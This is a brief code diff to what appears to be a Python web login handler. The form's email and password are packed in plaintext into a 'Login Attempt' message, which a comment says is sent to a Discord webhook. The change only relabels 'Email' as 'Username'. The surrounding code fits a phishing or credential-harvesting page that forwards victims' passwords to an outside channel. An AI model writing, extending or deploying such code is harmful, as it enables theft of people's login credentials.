@@ -22,7 +22,7 @@ async def login(request: Request, email: str = Form(...), password: str = Form(.
 
     # Prepare the data to send to Discord
     data = {
-        "content": f"Login Attempt:\nEmail: {email}\nPassword: {password}"
+        "content": f"Login Attempt:\nUsername: {email}\nPassword: {password}"
     }
 
     # Send the data to the Discord webhook
